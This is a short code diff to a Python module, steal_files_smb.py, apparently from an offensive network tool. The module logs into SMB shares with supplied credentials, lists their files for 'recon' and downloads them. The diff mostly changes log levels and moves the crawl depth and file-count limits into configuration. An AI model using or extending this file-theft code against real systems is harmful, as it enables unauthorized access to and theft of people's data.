@@ -21,7 +21,7 @@ SMB2_CAT_BIN = os.path.join(_script_dir, 'bin', 'smb2-cat')
 SMB2_SHARE_ENUM_BIN = os.path.join(_script_dir, 'bin', 'smb2-share-enum')
 
 # Configure the logger
-logger = Logger(name="steal_files_smb.py", level=logging.DEBUG)
+logger = Logger(name="steal_files_smb.py", level=logging.INFO)
 
 # Define the necessary global variables
 b_class = "StealFilesSMB"
@@ -54,7 +54,7 @@ class StealFilesSMB:
         try:
             conn = SMBConnection(username, password, "Bjorn", "Target", use_ntlm_v2=True, is_direct_tcp=True)
             conn.connect(ip, 445, timeout=30)
-            logger.debug(f"Connected to {ip} via pysmb as {username}")
+            logger.info(f"Connected to {ip} via SMB as {username}")
             self.smb_connected = True
             return conn
         except Exception as e:
@@ -115,7 +115,7 @@ class StealFilesSMB:
             if returncode == 0 and stdout:
                 with open(local_path, 'wb') as f:
                     f.write(stdout)
-                logger.debug(f"Downloaded: {remote_path} (smb2-cat)")
+                logger.success(f"Downloaded: {remote_path}")
                 return True
             else:
                 return False
@@ -137,7 +137,7 @@ class StealFilesSMB:
                 f.write("#" + "=" * 60 + "\n")
                 for file in sorted(files):
                     f.write(f"{file}\n")
-            logger.info(f"Saved file listing ({len(files)} files) to {listing_file}")
+            logger.info(f"Saved file listing ({len(files)} files)")
         except Exception as e:
             logger.error(f"Error saving file listing: {e}")
 
@@ -168,15 +168,20 @@ class StealFilesSMB:
             # Only log at debug level to avoid log spam
             logger.debug(f"Cannot access {dir_path} in {share_name}: {e}")
 
-    def find_files(self, conn, share_name, dir_path, ip=None, mac=None, depth=0, max_depth=3):
+    def find_files(self, conn, share_name, dir_path, ip=None, mac=None, depth=0, max_depth=None):
         """
         Find files in the SMB share based on the configuration criteria.
-        Includes depth limit (default 3) and file limit (500) to prevent excessive scanning.
+        Uses steal_max_depth and steal_max_files from config to prevent excessive scanning.
         Saves full file listing to recon.
         """
+        # Get limits from config
+        if max_depth is None:
+            max_depth = getattr(self.shared_data, 'steal_max_depth', 3)
+        max_files = getattr(self.shared_data, 'steal_max_files', 500)
+
         # Discover files with limits
         all_files = []
-        self.discover_all_files(conn, share_name, dir_path, all_files, depth, max_depth, max_files=500)
+        self.discover_all_files(conn, share_name, dir_path, all_files, depth, max_depth, max_files)
 
         # Save complete file listing for recon
         if ip and mac and all_files:
@@ -212,7 +217,7 @@ class StealFilesSMB:
             with open(local_file_path, 'wb') as f:
                 conn.retrieveFile(share_name, remote_file, f)
             # Use debug level for individual files to reduce log spam
-            logger.debug(f"Downloaded: {remote_file}")
+            logger.success(f"Downloaded: {remote_file}")
         except Exception as e:
             logger.debug(f"Failed to download {remote_file}: {e}")
 
